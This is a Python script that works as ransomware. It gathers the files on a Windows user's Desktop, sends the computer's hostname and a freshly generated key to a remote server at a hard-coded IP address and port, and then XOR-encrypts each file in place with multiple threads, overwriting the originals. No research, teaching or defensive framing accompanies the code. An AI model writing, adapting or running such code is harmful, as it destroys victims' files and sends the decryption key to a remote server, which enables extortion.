import random
import os
import threading
import queue
import socket  # Previously commented out
import traceback

# Configuration
IP_ADDR = '192.0.0.44'
PORT = 4555
ENCRYPTION_LEVEL = 512 // 8
KEY_CHAR_OPTIONS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~`!@#$%^&*()_+=-<>?'

# Thread-safe queue
q = queue.Queue()


# XOR Encryption Function
def encrypt_file(key):
    while True:
        file_path = q.get()
        print(f'Encrypting {file_path}')
        try:
            key_index = 0
            max_key_index = len(key)

            with open(file_path, 'rb') as f:
                data = f.read()

            encrypted_data = bytearray()
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                encrypted_data.append(xor_byte)
                key_index = (key_index + 1) % max_key_index

            # Overwrite the original file with encrypted data
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)

            print(f'Successfully encrypted {file_path}')
        except Exception as e:
            print(f'Failed to encrypt {file_path}: {e}')
            traceback.print_exc()
        finally:
            q.task_done()


def generate_key(length):
    return ''.join(random.choice(KEY_CHAR_OPTIONS) for _ in range(length))


def get_desktop_files():
    print('Gathering files from Desktop...')
    desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    abs_files = []

    for filename in os.listdir(desktop_path):
        file_path = os.path.join(desktop_path, filename)
        if os.path.isfile(file_path) and not filename.endswith('.exe'):
            abs_files.append(file_path)

    print(f'Found {len(abs_files)} files to encrypt.')
    return abs_files


def main():
    try:
        hostname = os.getenv('COMPUTERNAME')
        files = get_desktop_files()
        key = generate_key(ENCRYPTION_LEVEL)

        print('Connecting to server...')
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((IP_ADDR, PORT))
            print('Connected. Sending hostname and key...')
            s.send(f'{hostname} : {key}'.encode('utf-8'))
            print('Transmission complete.')

        # Queue up files for threads
        for f in files:
            q.put(f)

        # Start threads
        for _ in range(10):
            t = threading.Thread(target=encrypt_file, args=(key,), daemon=True)
            t.start()

        q.join()
        print('Encryption complete.')

    except Exception as e:
        print(f'Error: {e}')
        traceback.print_exc()

    input('Press Enter to exit...')


if __name__ == '__main__':
    main()
